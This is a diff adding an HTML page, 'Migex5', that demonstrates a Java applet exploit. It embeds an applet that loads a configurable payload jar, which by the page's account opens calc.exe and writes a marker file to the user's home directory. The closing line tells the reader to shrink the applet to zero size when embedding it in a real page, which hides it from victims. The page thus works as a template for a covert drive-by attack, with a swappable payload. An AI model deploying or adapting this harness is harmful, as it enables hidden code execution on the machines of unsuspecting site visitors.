@@ -1,0 +1,37 @@
+<html>
+<head>
+</head>
+<body>
+<h2>Migex5</h2>
+<p>This page demonstrates the exploit. The small square below contains an applet that should 
+load a default payload and should open calc.exe on Windows and place a file in the
+users home directory with the name <code>you_have_been_exploited.txt</code>.
+</p>
+<table border="1px solid black">
+<tr>
+<td>
+
+<object classid="clsid:CAFEEFAC-0016-0000-0000-ABCDEFFEDCBA"
+     width=200 height=200>
+    <PARAM name="code" value="x.XAppletW">
+    <PARAM name="archive" value="x.jar">
+    <param name="pJar" value="payload.jar"/>
+    <param name="pClass" value="payload.DemoPayload"/>
+    <comment>
+<applet code = 'x.XAppletW' 
+    archive = 'x.jar'
+    width = 200
+    height = 200>
+  <param name="pJar" value="payload.jar"/>    
+  <param name="pClass" value="payload.DemoPayload"/>      
+  Applets seem not to be supported on this browser.  
+</applet>
+    </comment>
+</object>
+
+</td>
+</tr>
+</table>
+<p>When embedding the applet in a real page, use width=0 and height=0!</p>
+</body>
+</html>
